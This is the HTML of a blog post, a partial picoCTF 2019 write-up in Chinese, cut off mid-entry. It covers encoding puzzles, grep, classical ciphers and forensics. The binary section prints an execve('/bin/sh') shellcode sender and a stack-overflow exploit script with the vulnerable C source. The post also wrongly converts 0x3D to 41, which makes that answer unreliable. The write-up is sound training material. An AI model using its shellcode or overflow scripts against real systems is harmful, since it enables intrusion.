@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>2019picoCTF部分wp(5000分记录) | Damya&#39;s Blog | あややこやや</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="个人ctf竞赛">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Damya</h5>
+          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
+            
+              <span>3</span>
+            
+              <span>9</span>
+            
+              <span>7</span>
+            
+              <span>5</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DamyaHome" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>2019picoCTF部分wp(5000分记录)</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">2019picoCTF部分wp(5000分记录)</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-10T13:52:28.000Z" itemprop="datePublished" class="page-time">
+  2019-11-10
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-2019picoCTF-5000分wp"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">2019picoCTF部分wp(5000分记录)</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-10 21:52:28" datetime="2019-11-10T13:52:28.000Z"  itemprop="datePublished">2019-11-10</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="一般技能"><a href="#一般技能" class="headerlink" title="一般技能"></a>一般技能</h1><h2 id="The-Factory’s-Secret-Points-1"><a href="#The-Factory’s-Secret-Points-1" class="headerlink" title="The Factory’s Secret - Points: 1"></a>The Factory’s Secret - Points: 1</h2><blockquote>
+<p>There appear to be some mysterious glyphs hidden inside this abandoned factory… I wonder what would happen if you collected them all?</p>
+</blockquote>
+<blockquote>
+<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p>
+</blockquote>
+<p>游戏题,需要做完所有题目才能通关</p>
+<h2 id="2Warm-Points-50"><a href="#2Warm-Points-50" class="headerlink" title="2Warm - Points: 50"></a>2Warm - Points: 50</h2><blockquote>
+<p>Can you convert the number 42 (base 10) to binary (base 2)?</p>
+</blockquote>
+<blockquote>
+<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘11111’, you would submit ‘picoCTF{11111}’ as the flag.</p>
+</blockquote>
+<p>42–&gt;101010</p>
+<p>picoCTF{101010}</p>
+<h2 id="Lets-Warm-Up-Points-50"><a href="#Lets-Warm-Up-Points-50" class="headerlink" title="Lets Warm Up - Points: 50"></a>Lets Warm Up - Points: 50</h2><blockquote>
+<p>If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?</p>
+</blockquote>
+<blockquote>
+<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p>
+</blockquote>
+<p>0x70–&gt;p</p>
+<p>picoCTF{p}</p>
+<h2 id="Warmed-Up-Points-50"><a href="#Warmed-Up-Points-50" class="headerlink" title="Warmed Up - Points: 50"></a>Warmed Up - Points: 50</h2><blockquote>
+<p>What is 0x3D (base 16) in decimal (base 10).</p>
+</blockquote>
+<blockquote>
+<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘22’, you would submit ‘picoCTF{22}’ as the flag.</p>
+</blockquote>
+<p>0x3D–&gt;41</p>
+<p>picoCTF{41}</p>
+<h2 id="Bases-Points-100"><a href="#Bases-Points-100" class="headerlink" title="Bases - Points: 100"></a>Bases - Points: 100</h2><blockquote>
+<p>What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.</p>
+</blockquote>
+<blockquote>
+<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p>
+</blockquote>
+<p>base64解密</p>
+<p>picoCTF{l3arn_th3_r0p35}</p>
+<h2 id="First-Grep-Points-100"><a href="#First-Grep-Points-100" class="headerlink" title="First Grep - Points: 100"></a>First Grep - Points: 100</h2><blockquote>
+<p>Can you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way. You can also find the file in /problems/first-grep_6_c2319e8af66fa6bec197edc733dd52dd on the shell server.</p>
+</blockquote>
+<blockquote>
+<p>Hints: grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p>
+</blockquote>
+<p>拖进winhex里,搜索字符</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{grep_is_good_to_find_things_cdb327ab}</p>
+<h2 id="Resources-Points-100"><a href="#Resources-Points-100" class="headerlink" title="Resources - Points: 100"></a>Resources - Points: 100</h2><blockquote>
+<p>We put together a bunch of resources to help you out on our website! If you go over there, you might even find a flag! <a href="https://picoctf.com/resources" target="_blank" rel="noopener">https://picoctf.com/resources</a> (link)</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{r3source_pag3_f1ag}</p>
+<h2 id="strings-it-Points-100"><a href="#strings-it-Points-100" class="headerlink" title="strings it - Points: 100"></a>strings it - Points: 100</h2><blockquote>
+<p>Can you find the flag in file without running it? You can also find the file in /problems/strings-it_5_1fd17da9526a76a4fffce289dee10fbb on the shell server.</p>
+</blockquote>
+<blockquote>
+<p>Hints: <a href="https://linux.die.net/man/1/strings" target="_blank" rel="noopener">strings</a><br>执行strins命令,查找flag</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings strings | grep picoCTF</span><br></pre></td></tr></table></figure>
+<p>picoCTF{5tRIng5_1T_dd38f284}</p>
+<h2 id="what’s-a-net-cat-Points-100"><a href="#what’s-a-net-cat-Points-100" class="headerlink" title="what’s a net cat? - Points: 100"></a>what’s a net cat? - Points: 100</h2><blockquote>
+<p>Using netcat (nc) is going to be pretty important. Can you connect to 2019shell1.picoctf.com at port 21865 to get the flag?</p>
+</blockquote>
+<blockquote>
+<p>Hints: nc <a href="https://linux.die.net/man/1/nc" target="_blank" rel="noopener">tutorial</a></p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./3.png" title="图片" data-fancybox="images"><img src="./3.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{nEtCat_Mast3ry_4fefb685}</p>
+<h2 id="Based-Points-200"><a href="#Based-Points-200" class="headerlink" title="Based - Points: 200"></a>Based - Points: 200</h2><blockquote>
+<p>To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc 2019shell1.picoctf.com 29594.</p>
+</blockquote>
+<blockquote>
+<p>Hints: I hear python can convert things.<br>  It might help to have multiple windows open</p>
+</blockquote>
+<p>简单的进制转换,嫌麻烦不想写脚本的话网上都有在线转换</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./4.png" title="图片" data-fancybox="images"><img src="./4.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{learning_about_converting_values_e67b1990}</p>
+<h2 id="First-Grep-Part-II-Points-200"><a href="#First-Grep-Part-II-Points-200" class="headerlink" title="First Grep: Part II - Points: 200"></a>First Grep: Part II - Points: 200</h2><blockquote>
+<p>Can you find the flag in /problems/first-grep–part-ii_4_ca16fbcd16c92f0cb1e376a6c188d58f/files on the shell server? Remember to use grep.</p>
+</blockquote>
+<blockquote>
+<p>Hints: grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p>
+</blockquote>
+<p>使用命令,在当前目录下的多个文件中查找关键词</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">'picoCTF'</span> . -Rn</span><br></pre></td></tr></table></figure>
+<p>得到输出<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./files6/file5:2:picoCTF&#123;grep_r_to_find_this_0e28f3ee&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="plumbing-Points-200"><a href="#plumbing-Points-200" class="headerlink" title="plumbing - Points: 200"></a>plumbing - Points: 200</h2><blockquote>
+<p>Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to 2019shell1.picoctf.com 18944.</p>
+</blockquote>
+<blockquote>
+<p>Hints: Remember the flag format is picoCTF{XXXX}<br>  What’s a pipe? No not that kind of pipe… This <a href="http://www.linfo.org/pipes.html" target="_blank" rel="noopener">kind</a></p>
+</blockquote>
+<p>输入命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 2019shell1.picoctf.com 18944 | grep picoCTF</span><br></pre></td></tr></table></figure>
+<p>picoCTF{digital_plumb3r_1d5b7de7}</p>
+<h2 id="where-is-the-file-Points-200"><a href="#where-is-the-file-Points-200" class="headerlink" title="where-is-the-file - Points: 200"></a>where-is-the-file - Points: 200</h2><blockquote>
+<p>I’ve used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0.</p>
+</blockquote>
+<blockquote>
+<p>Hints: What command can see/read files?<br>  What’s in the manual page of ls?</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./5.png" title="图片" data-fancybox="images"><img src="./5.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>ls -a 参数能查看隐藏文件</p>
+<p>picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}</p>
+<h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><h2 id="handy-shellcode-Points-50"><a href="#handy-shellcode-Points-50" class="headerlink" title="handy-shellcode - Points: 50"></a>handy-shellcode - Points: 50</h2><blockquote>
+<p>This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405 on the shell server. Source.</p>
+</blockquote>
+<blockquote>
+<p>Hints: You might be able to find some good shellcode online.</p>
+</blockquote>
+<p>在比赛的shell里输入exp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">'vuln'</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">'\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}</p>
+<h2 id="practice-run-1-Points-50"><a href="#practice-run-1-Points-50" class="headerlink" title="practice-run-1 - Points: 50"></a>practice-run-1 - Points: 50</h2><blockquote>
+<p>You’re going to need to know how to run programs if you’re going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag.</p>
+</blockquote>
+<blockquote>
+<p>Hints: How do you execute a program in a command line?</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./6.png" title="图片" data-fancybox="images"><img src="./6.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{g3t_r3adY_2_r3v3r53}</p>
+<h2 id="OverFlow-0-Points-100"><a href="#OverFlow-0-Points-100" class="headerlink" title="OverFlow 0 - Points: 100"></a>OverFlow 0 - Points: 100</h2><blockquote>
+<p>This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_6_1279241c50d050a1045301d7970f2fe3 on the shell server. Source.</p>
+</blockquote>
+<blockquote>
+<p>Hints: Find a way to trigger the flag to print<br>  If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren’t expecting.</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You entered: %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter an argument next time\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传入的参数没有限制大小造成在vuln函数里面strcpy至buf时可能导致栈溢出,可以从0x804a080开始覆盖<br>执行exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./vuln'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line">flag_addr = <span class="number">0x804a080</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">buf = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload  = buf + <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(puts_plt) + <span class="string">'aaaa'</span> + p32(flag_addr)</span><br><span class="line">p = process(argv=[<span class="string">'./vuln'</span>, payload])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./7.png" title="图片" data-fancybox="images"><img src="./7.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{3asY_P3a5yd4a28467}</p>
+<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="The-Numbers-Points-50"><a href="#The-Numbers-Points-50" class="headerlink" title="The Numbers - Points: 50"></a>The Numbers - Points: 50</h2><blockquote>
+<p>The numbers… what do they mean?</p>
+</blockquote>
+<blockquote>
+<p>Hints: The flag is in the format PICOCTF{}</p>
+</blockquote>
+<p>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14}</p>
+<p>对应字母表A-Z</p>
+<p>PICOCTF{THENUMBERSMASON}</p>
+<h2 id="13-Points-100"><a href="#13-Points-100" class="headerlink" title="13 - Points: 100"></a>13 - Points: 100</h2><blockquote>
+<p>Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}</p>
+</blockquote>
+<blockquote>
+<p>Hints: This can be solved online if you don’t want to do it by hand!</p>
+</blockquote>
+<p>解凯撒密码</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./8.png" title="图片" data-fancybox="images"><img src="./8.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{not_too_bad_of_a_problem}</p>
+<h2 id="Easy1-Points-100"><a href="#Easy1-Points-100" class="headerlink" title="Easy1 - Points: 100"></a>Easy1 - Points: 100</h2><blockquote>
+<p>The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We’ve given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?.</p>
+</blockquote>
+<blockquote>
+<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{HELLO}’ as the flag.<br>  Please use all caps for the message.</p>
+</blockquote>
+<p>维吉尼亚密码解密</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./9.png" title="图片" data-fancybox="images"><img src="./9.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{CRYPTOISFUN}</p>
+<h2 id="caesar-Points-100"><a href="#caesar-Points-100" class="headerlink" title="caesar - Points: 100"></a>caesar - Points: 100</h2><blockquote>
+<p>Decrypt this message. You can find the ciphertext in /problems/caesar_4_33e5994add902b2321c8c38c8b962eff on the shell server.</p>
+</blockquote>
+<blockquote>
+<p>Hints: caesar cipher tutorial</p>
+</blockquote>
+<p>在线解凯撒密码,整出一个看上去挺正常的</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./10.png" title="图片" data-fancybox="images"><img src="./10.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{crossingtherubiconljmawiae}</p>
+<h2 id="Flags-Points-200"><a href="#Flags-Points-200" class="headerlink" title="Flags - Points: 200"></a>Flags - Points: 200</h2><blockquote>
+<p>What do the flags mean?</p>
+</blockquote>
+<blockquote>
+<p>Hints: The flag is in the format PICOCTF{}</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./11.png" title="图片" data-fancybox="images"><img src="./11.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>国际海事信号旗图标+数字旗号</p>
+<p>PICOCTF{F1AG5AND5TUFF}</p>
+<h2 id="Tapping-Points-200"><a href="#Tapping-Points-200" class="headerlink" title="Tapping - Points: 200"></a>Tapping - Points: 200</h2><blockquote>
+<p>Theres tapping coming in from the wires. What’s it saying nc 2019shell1.picoctf.com 37911.</p>
+</blockquote>
+<blockquote>
+<p>Hints: What kind of encoding uses dashes and dots?<br>  The flag is in the format PICOCTF{}</p>
+</blockquote>
+<p>nc过去后是摩斯密码,脚本解一下</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./12.png" title="图片" data-fancybox="images"><img src="./12.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>PICOCTF{M0RS3C0D31SFUN2265937663}</p>
+<h2 id="la-cifra-de-Points-200"><a href="#la-cifra-de-Points-200" class="headerlink" title="la cifra de - Points: 200"></a>la cifra de - Points: 200</h2><blockquote>
+<p>I found this cipher in an old book. Can you figure out what it says? Connect with nc 2019shell1.picoctf.com 39776.</p>
+</blockquote>
+<blockquote>
+<p>Hints: There are tools that make this easy.<br>  Perhaps looking at history will help</p>
+</blockquote>
+<p>1402Vigenère密码</p>
+<p>学长给的破解网站  <a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p>
+<p>picoCTF{b311a50_0r_v1gn3r3_c1ph3r1119c336}</p>
+<h2 id="waves-over-lambda-Points-300"><a href="#waves-over-lambda-Points-300" class="headerlink" title="waves over lambda - Points: 300"></a>waves over lambda - Points: 300</h2><blockquote>
+<p>We made alot of substitutions to encrypt this. Can you decrypt it? Connect with nc 2019shell1.picoctf.com 32282.</p>
+</blockquote>
+<blockquote>
+<p>Hints: Flag is not in the usual flag format</p>
+</blockquote>
+<p>破解网址  <a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p>
+<p>用statistics模式</p>
+<p>picoCTF{frequency_is_c_over_lambda_ptthttobuc}</p>
+<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="Glory-of-the-Garden-Points-50"><a href="#Glory-of-the-Garden-Points-50" class="headerlink" title="Glory of the Garden - Points: 50"></a>Glory of the Garden - Points: 50</h2><blockquote>
+<p>This garden contains more than it seems. You can also find the file in /problems/glory-of-the-garden_0_25ece79ae00914856938a4b19d0e31af on the shell server.</p>
+</blockquote>
+<blockquote>
+<p>Hints: What is a hex editor?</p>
+</blockquote>
+<p>下载是张图片,拖进notepad里,结尾发现flag</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./13.png" title="图片" data-fancybox="images"><img src="./13.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{more_than_m33ts_the_3y3f089EdF0}</p>
+<h2 id="unzip-Points-50"><a href="#unzip-Points-50" class="headerlink" title="unzip - Points: 50"></a>unzip - Points: 50</h2><blockquote>
+<p>Can you unzip this file and get the flag?</p>
+</blockquote>
+<blockquote>
+<p>Hints: put the flag in the format picoCTF{XXXXX}</p>
+</blockquote>
+<p>我想多了!!flag就是图片上的文字</p>
+<p>picoCTF{unz1pp1ng_1s_3a5y}</p>
+<h2 id="So-Meta-Points-150"><a href="#So-Meta-Points-150" class="headerlink" title="So Meta - Points: 150"></a>So Meta - Points: 150</h2><blockquote>
+<p>Find the flag in this picture. You can also find the file in /problems/so-meta_0_7c0b2ae7a38b024c6b1c68cf50970a88.</p>
+</blockquote>
+<blockquote>
+<p>Hints: What does meta mean in the context of files?<br>  Ever hear of metadata?</p>
+</blockquote>
+<p>winhex打开,结尾发现flag</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./14.png" title="图片" data-fancybox="images"><img src="./14.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{s0_m3ta_dc38ce45}</p>
+<h2 id="What-Lies-Within-Points-150"><a href="#What-Lies-Within-Points-150" class="headerlink" title="What Lies Within - Points: 150"></a>What Lies Within - Points: 150</h2><blockquote>
+<p>Theres something in the building. Can you retrieve the flag?</p>
+</blockquote>
+<blockquote>
+<p>Hints: There is data encoded somewhere, there might be an online decoder</p>
+</blockquote>
+<p>拖进stegsolve里提取最低位</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./15.png" title="图片" data-fancybox="images"><img src="./15.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{h1d1ng_1n_th3_b1t5}</p>
+<h2 id="extensions-Points-150"><a href="#extensions-Points-150" class="headerlink" title="extensions - Points: 150"></a>extensions - Points: 150</h2><blockquote>
+<p>This is a really weird text file TXT? Can you find the flag?</p>
